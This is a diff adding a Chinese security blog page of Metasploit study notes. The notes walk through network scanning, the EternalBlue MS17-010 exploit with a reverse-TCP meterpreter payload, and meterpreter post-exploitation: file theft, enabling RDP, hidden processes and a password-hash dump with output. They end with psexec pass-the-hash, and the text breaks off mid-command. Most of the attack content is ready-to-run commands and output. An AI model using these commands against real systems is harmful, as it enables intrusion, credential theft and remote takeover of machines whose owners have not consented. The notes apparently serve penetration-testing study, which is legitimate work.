@@ -1,0 +1,830 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script type="text/javascript" src="js/jquery.min.js"></script>
+<script type="text/javascript" src="js/spig.js"></script>
+<link rel="stylesheet" href="css/lib/spigPet.css" type="text/css"/>
+<script type="text/javascript">
+var isindex = true;
+var visitor = true;
+</script>
+
+
+<div id="spig" class="spig">
+    <div id="message"></div>
+    <div id="mumu" class="mumu"></div>
+</div>
+
+ 
+    
+
+    <title>metasploit续 | 知秋’s blog</title>
+    <meta name="author" content="知秋">
+    
+    <meta name="description" content="知秋">
+    
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <meta property="og:title" content="metasploit续"/>
+    <meta property="og:site_name" content="知秋"/>
+
+    
+    <meta property="og:image" content=""/>
+    
+
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <link rel="alternate" href="/atom.xml" title="知秋" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/lib/materialize.min.css">
+    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+
+    
+        <link rel="stylesheet" href="/css/lib/tomorrow-night-blue.min.css" type="text/css">
+    
+    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+</head>
+
+<script type="text/javascript" src="../../js/love.js"></script>  
+ 
+<script type="text/javascript"
+color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
+ 
+  
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/background1.JPG); background-repeat: no-repeat;
+  background-size: 100% 100%;">
+    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">
+   
+    <nav class="indigo">
+    <div class="nav-wrapper">
+        <a href="#" data-activates="main-menu" class="button-collapse">
+            <i class="fa fa-navicon"></i>
+        </a>
+        <div class="">
+            <a href="/" class="brand-logo hide-on-med-and-down">知秋</a>
+            <ul class="right hide-on-med-and-down">
+                
+                    <li>
+                        <a class="menu-home " href="/" >
+                            <i class="fa fa-home "></i>
+                            
+                            Home
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-archive " href="/archives" >
+                            <i class="fa fa-archive "></i>
+                            
+                            Archives
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                            <i class="fa fa-bookmark "></i>
+                            
+                            Categories
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-reading " href="/reading" >
+                            <i class="fa fa-book "></i>
+                            
+                            Reading
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-about " href="/about" >
+                            <i class="fa fa-user "></i>
+                            
+                            About
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a class="menu-search modal-trigger " href="#search" >
+                            <i class="fa fa-search "></i>
+                            
+                            Search
+                        </a>
+                    </li>
+                
+            </ul>
+            <div>
+    <ul class="side-nav indigo darken-1" id="main-menu">
+        
+        <li class="side-user">
+            <div class="row">
+                <div class="col s4 no-padding">
+                    <img class="avatar-image circle responsive-img" src="../../images/touxiang.jpeg" alt="User Avatar">
+                </div>
+                <div class="info col s8 valign-wrapper no-padding">
+                    <div class="valign">
+                        <p class="name">知秋</p>
+                        <p class="desc">安全小白</p>
+                    </div>
+                </div>
+            </div>
+        </li>
+        
+
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-home " href="/" >
+                    <i class="fa fa-home "></i>
+                    
+                    Home
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-archive " href="/archives" >
+                    <i class="fa fa-archive "></i>
+                    
+                    Archives
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
+                    <i class="fa fa-bookmark "></i>
+                    
+                    Categories
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-reading " href="/reading" >
+                    <i class="fa fa-book "></i>
+                    
+                    Reading
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-about " href="/about" >
+                    <i class="fa fa-user "></i>
+                    
+                    About
+                </a>
+            </li>
+        
+            <li class="no-padding">
+                <a class="waves-effect menu-search modal-trigger " href="#search" >
+                    <i class="fa fa-search "></i>
+                    
+                    Search
+                </a>
+            </li>
+        
+    </ul>
+
+    <ul class="side-nav indigo darken-1" id="category-menu">
+    
+
+            
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/essay/">
+                    essay <span class="right">5</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/ctf/">
+                    ctf <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/web/">
+                    web <span class="right">11</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/ctf/writeup/">
+                    writeup <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/knowledge/">
+                    knowledge <span class="right">12</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/note/">
+                    note <span class="right">8</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/crypt/">
+                    crypt <span class="right">1</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-1" collapse-level="1">
+                <a class="no-padding" href="/categories/knowledge/vulnerability/">
+                    vulnerability <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+            <li class="collapse-level-0" collapse-level="0">
+                <a class="no-padding" href="/categories/life/">
+                    life <span class="right">3</span></a>
+                </a>
+            </li>
+
+        
+
+    </ul>
+</div>
+
+        </div>
+    </div>
+</nav>
+
+<div id="search" class="modal search-modal">
+    <div class="row">
+        <div class="input-field col s12">
+              <input id="search-input" type="text">
+              <label for="search-input">Search</label>
+        </div>
+
+    </div>
+    <div id="search-result" class="search-result col s12">
+
+    </div>
+</div>
+
+
+	<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+<script>
+(function($){$.fn.snow=function(options){var $flake=$('<div id="flake" />').css({'position':'absolute','top':'-50px'}).html('&#10052;'),documentHeight=$(document).height(),documentWidth=$(document).width(),defaults={minSize:10,maxSize:20,newOn:500,flakeColor:"#FFFFFF"},options=$.extend({},defaults,options);var interval=setInterval(function(){var startPositionLeft=Math.random()*documentWidth-100,startOpacity=0.5+Math.random(),sizeFlake=options.minSize+Math.random()*options.maxSize,endPositionTop=documentHeight-40,endPositionLeft=startPositionLeft-100+Math.random()*200,durationFall=documentHeight*10+Math.random()*5000;$flake.clone().appendTo('body').css({left:startPositionLeft,opacity:startOpacity,'font-size':sizeFlake,color:options.flakeColor}).animate({top:endPositionTop,left:endPositionLeft,opacity:0.2},durationFall,'linear',function(){$(this).remove()});},options.newOn);};})(jQuery);
+$.fn.snow({ minSize: 10, maxSize: 60, newOn: 1000, flakeColor: '#FFF' });
+</script>
+    <main>
+        <div class="container main-container">
+    <nav class="page-nav hide-on-small-only">
+    <div class="nav-wrapper indigo">
+        <span class="breadcrumb">Current page(Categories)</span>
+        
+            
+    
+    
+    <a class="breadcrumb" href="/categories/knowledge/">knowledge</a><a class="breadcrumb" href="/categories/knowledge/note/">note</a>
+
+
+        
+
+        
+    </div>
+</nav>
+
+<article>
+    <div class="card">
+        <div class="card-content">
+            
+
+            <div class="article-title">
+                
+    
+        <h1>metasploit续</h1>
+    
+
+
+            </div>
+            <time class="pink-link-context" datetime="2018-04-28T13:19:00.000Z"><a href="/posts/9e35f352.html">2018-04-28</a></time>
+
+            <span id="busuanzi_container_page_pv" class="read-times-container">
+    <i class="fa fa-eye"></i>
+    <span id="busuanzi_value_page_pv"></span>
+</span>
+
+            
+    <div class="tags-row">
+        
+            <a href="/tags/knowledge/" class="chip pink lighten-1">knowledge</a>
+        
+            <a href="/tags/note/" class="chip pink lighten-1">note</a>
+        
+    </div>
+
+
+            <div class="toc pink-link-context hide-on-med-and-down">
+    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#信息收集"><span class="section table-of-contents-text">信息收集</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#漏洞扫描"><span class="section table-of-contents-text">漏洞扫描</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#渗透攻击"><span class="section table-of-contents-text">渗透攻击</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#meterpreter"><span class="section table-of-contents-text">meterpreter</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#msfvenom"><span class="section table-of-contents-text">msfvenom</span></a></li></ol>
+</div>
+
+
+            <div class="entry pink-link-context">
+                <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1域名、dns信息收集<br>1)whois查询<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois 域名|ip</span><br></pre></td></tr></table></figure></p>
+<p>2)nslookup<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup 域名</span><br></pre></td></tr></table></figure></p>
+<p>2.nmap<br>1)隐秘的tcp扫描和不ping。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn ip</span><br></pre></td></tr></table></figure></p>
+<p>2)Tcp空闲扫描<br>window上运行metasploit，线程数最好不要超过16，UXNIX平台上不要超过128<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf auxiliary(ipidseq) &gt; show options</span><br><span class="line">msf auxiliary(ipidseq) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ipidseq) &gt; set threads 60</span><br><span class="line">threads =&gt; 60</span><br><span class="line">msf auxiliary(ipidseq) &gt; run</span><br></pre></td></tr></table></figure></p>
+<p>发现空闲主机192.168.2.5可用于空闲扫描，对目标机进行扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf auxiliary(ipidseq) &gt;nmap -PN -sI 192.168.2.5 192.168.2.8</span><br></pre></td></tr></table></figure></p>
+<p>3)msf中的db_nmap<br>4)查看metasploit的端口扫描工具<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; search portscan</span><br></pre></td></tr></table></figure></p>
+<p>3.针对性扫描<br>1）服务器消息块协议扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure></p>
+<p>2）搜寻配置不当的mssql<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping  </span><br><span class="line">msf auxiliary(mssql_ping) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(mssql_ping) &gt; set threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(mssql_ping) &gt; run</span><br></pre></td></tr></table></figure></p>
+<p>3）ssh服务器扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;search ssh_version</span><br></pre></td></tr></table></figure></p>
+<p>4)FTP扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version   </span><br><span class="line">msf auxiliary(ftp_version) &gt; set threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(ftp_version) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ftp_version) &gt; run</span><br></pre></td></tr></table></figure></p>
+<p>5)简单的网络管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search snmp_login</span><br></pre></td></tr></table></figure></p>
+<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a><a href="https://blog.csdn.net/chengyu779394084/article/details/50602459" target="_blank" rel="noopener">漏洞扫描</a></h1><p>1.nexpose  </p>
+<p>2.nessus<br>3.扫描开放的vnc空口令<br>最新版的vnc服务器不再允许使用空口令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use  auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure></p>
+<p>4.扫描开放的x11服务器<br>x11在新的操作系统上不再使用的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/x11/open_x11</span><br></pre></td></tr></table></figure></p>
+<p>2.利用扫描结果进行自动化攻击  </p>
+<p>利用autopwn自动攻击(不建议）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;db_connect postgres:toor@127.0.0.1/msf1</span><br><span class="line">db_import /root/nessus.nbe</span><br><span class="line">db_autopwn -e -t -r -x -p</span><br></pre></td></tr></table></figure></p>
+<h1 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h1><p>1.渗透攻击基础 </p>
+<p>msf中的命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;?</span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    advanced      Displays advanced options for one or more modules</span><br><span class="line">    back          Move back from the current context</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    cd            Change the current working directory</span><br><span class="line">    color         Toggle color</span><br><span class="line">    connect       Communicate with a host</span><br><span class="line">    edit          Edit the current module with $VISUAL or $EDITOR</span><br><span class="line">    exit          Exit the console</span><br><span class="line">    get           Gets the value of a context-specific variable</span><br><span class="line">    getg          Gets the value of a global variable</span><br><span class="line">    grep          Grep the output of another command</span><br><span class="line">    help          Help menu</span><br><span class="line">    info          Displays information about one or more modules</span><br><span class="line">    irb           Drop into irb scripting mode</span><br><span class="line">    jobs          Displays and manages jobs</span><br><span class="line">    kill          Kill a job</span><br><span class="line">    load          Load a framework plugin</span><br><span class="line">    loadpath      Searches for and loads modules from a path</span><br><span class="line">    makerc        Save commands entered since start to a file</span><br><span class="line">    options       Displays global options or for one or more modules</span><br><span class="line">    popm          Pops the latest module off the stack and makes it active</span><br><span class="line">    previous      Sets the previously loaded module as the current module</span><br><span class="line">    pushm         Pushes the active or list of modules onto the module stack</span><br><span class="line">    quit          Exit the console</span><br><span class="line">    reload_all    Reloads all modules from all defined module paths</span><br><span class="line">    rename_job    Rename a job</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line">    route         Route traffic through a session</span><br><span class="line">    save          Saves the active datastores</span><br><span class="line">    search        Searches module names and descriptions</span><br><span class="line">    sessions      Dump session listings and display information about sessions</span><br><span class="line">    set           Sets a context-specific variable to a value</span><br><span class="line">    setg          Sets a global variable to a value</span><br><span class="line">    show          Displays modules of a given type, or all modules</span><br><span class="line">    sleep         Do nothing for the specified number of seconds</span><br><span class="line">    spool         Write console output into a file as well the screen</span><br><span class="line">    threads       View and manipulate background threads</span><br><span class="line">    unload        Unload a framework plugin</span><br><span class="line">    unset         Unsets one or more context-specific variables</span><br><span class="line">    unsetg        Unsets one or more global variables</span><br><span class="line">    use           Selects a module by name</span><br><span class="line">    version       Show the framework and console library version numbers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    creds             List all credentials in the database</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br></pre></td></tr></table></figure></p>
+<p>可用的渗透攻击模块<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;show exploits</span><br></pre></td></tr></table></figure></p>
+<p>可用的辅助模块<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;show auxiliary</span><br></pre></td></tr></table></figure></p>
+<p>可用的攻击载荷<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure></p>
+<p>2.永恒之蓝的利用<br>1)metasploit没有的集成的话去下载，或者更新到最新的。<br>ms17_010扫描模块的安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop# cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/</span><br></pre></td></tr></table></figure></p>
+<p>漏洞利用脚本的安装<br>把模块下载到对应的目录(kali下metasploit存放模块的目录是/usr/share/metasploit-framework/modules/)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/modules/exploits/windows/smb/ </span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-</span><br><span class="line">framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</span><br></pre></td></tr></table></figure></p>
+<p>2)漏洞扫描<br>nmap针对漏洞脚本的定向扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open</span><br></pre></td></tr></table></figure></p>
+<p>或者使用smb_ms17_010<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块</span><br><span class="line">show option # 查看模块配置选项</span><br><span class="line">set RHOST 192.168.1.1-254 # 配置扫描目标</span><br><span class="line">set THREADS 30 #配置扫描线程</span><br><span class="line">run #运行脚本</span><br></pre></td></tr></table></figure></p>
+<p>3)开始攻击<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt; use exploit/windows/smb/ms17_010_eternalblue # 调用ms17-010永恒之蓝漏洞攻击模块</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show targets #查看攻击的有效对象</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; info #查看详细信息 </span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; setg rhost 192.168.2.5 # 设定全局变量的攻击目标 192.168.2.5</span><br><span class="line">rhost =&gt; 192.168.2.5</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; set lhost 192.168.2.3 # 设定将meterpreter反弹给192.168.2.3</span><br><span class="line">lhost =&gt; 192.168.2.3</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; show options  # 查询攻击参数设置</span><br></pre></td></tr></table></figure></p>
+<h1 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h1><p>1.常见命令<br>基本命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background  # 让meterpreter处于后台模式  </span><br><span class="line">sessions -i index   # 与会话进行交互，index表示第一个session  </span><br><span class="line">quit  # 退出会话  </span><br><span class="line">shell # 获得控制台权限  </span><br><span class="line">irb # 开启ruby终端</span><br><span class="line">ps # 查看当前活跃进程  </span><br><span class="line">migrate  pid # 将Meterpreter会话移植到进程数位pid的进程中  </span><br><span class="line">kill pid # 杀死进程  </span><br><span class="line">getpid # 获取当前进程的pid  </span><br><span class="line">sysinfo # 查看目标机系统信息，如机器名，操作系统等  </span><br><span class="line"></span><br><span class="line">shutdown # 关机</span><br></pre></td></tr></table></figure>
+<p>截屏<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;screenshot</span><br></pre></td></tr></table></figure></p>
+<p>系统运行的平台信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;sysinfo</span><br></pre></td></tr></table></figure></p>
+<p>查看进程和进程转移<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps       </span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure></p>
+<p> 查看权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p>
+<p>获取目标机器的工作目录和得到当前系统的工作目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getwd  </span><br><span class="line">C:\Windows\system32</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getlwd </span><br><span class="line">/root</span><br></pre></td></tr></table></figure></p>
+<p>上传文件到目标主机和下载目标文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /root/1.txt c:\\</span><br><span class="line">[*] uploading  : /root/1.txt -&gt; c:\</span><br><span class="line">[*] uploaded   : /root/1.txt -&gt; c:\\1.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download c:/2.txt /root </span><br><span class="line">[*] Downloading: c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] Downloaded 5.00 B of 5.00 B (100.0%): c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] download   : c:/2.txt -&gt; /root/2.txt</span><br></pre></td></tr></table></figure></p>
+<p>搜索目标主机上的文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; search -h </span><br><span class="line">Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...</span><br><span class="line">Search for files.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )</span><br><span class="line">    -f &lt;opt&gt;  A file pattern glob to search for. (e.g. *secret*.doc?)</span><br><span class="line">    -h        Help Banner.</span><br><span class="line">    -r &lt;opt&gt;  Recursivly search sub directories. (Default: true)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; search -d c:\\  -r flase -f *.txt</span><br><span class="line">Found 2 results...</span><br><span class="line">    c:\1.txt (2 bytes)</span><br><span class="line">    c:\2.txt (5 bytes)</span><br></pre></td></tr></table></figure></p>
+<p>确定是不是虚拟机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm  </span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-VONVJ6OMEQ7 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br></pre></td></tr></table></figure></p>
+<p>开3389<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*] 	RDP is disabled; enabling it ...</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*] 	The Terminal Services service is not set to auto, changing it to auto ...</span><br><span class="line">[*] 	Opening port in local firewall if necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20180430181213_default_192.168.1.187_host.windows.cle_516653.txt</span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address        Remote address      State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------        --------------      -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135          0.0.0.0:*           LISTEN       0     0      696/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445          0.0.0.0:*           LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:3389         0.0.0.0:*           LISTEN       0     0      1040/svchost.exe</span><br></pre></td></tr></table></figure></p>
+<p>远程主机的3389的端口映射到本机的1235号端口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.1.187 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.1.187:3389</span><br></pre></td></tr></table></figure></p>
+<p>创建新进程cmd.exe，-H不可见，-i交互<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute</span><br><span class="line">Usage: execute -f file [options]</span><br><span class="line"></span><br><span class="line">Executes a command on the remote machine.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -H        Create the process hidden from view.</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the command.</span><br><span class="line">    -c        Channelized I/O (required for interaction).</span><br><span class="line">    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  The executable command to run.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -i        Interact with the process after creating it.</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        Execute from memory.</span><br><span class="line">    -s &lt;opt&gt;  Execute process in a given session as the session user</span><br><span class="line">    -t        Execute process with currently impersonated thread token</span><br><span class="line">meterpreter &gt; excte -H -f cmd.exe</span><br><span class="line">[-] Unknown command: excte.</span><br><span class="line">meterpreter &gt; execute -H -f cmd.exe</span><br><span class="line">Process 1840 created.</span><br></pre></td></tr></table></figure></p>
+<p>2.获取密码哈希值<br>aad3b435开头的哈希值是一个空的或者不存在的哈希值–空字符串的占位符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; run  post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></p>
+<p>3.用得到的管理员的用户哈希值登录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOST                                  yes       The target address</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                no        The password for the specified username</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set lhost 192.168.1.130</span><br><span class="line">lhost =&gt; 192.168.1.130</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set lpost 4333</span><br><span class="line">lpost =&gt; 4333</span><br><span class="line">msf 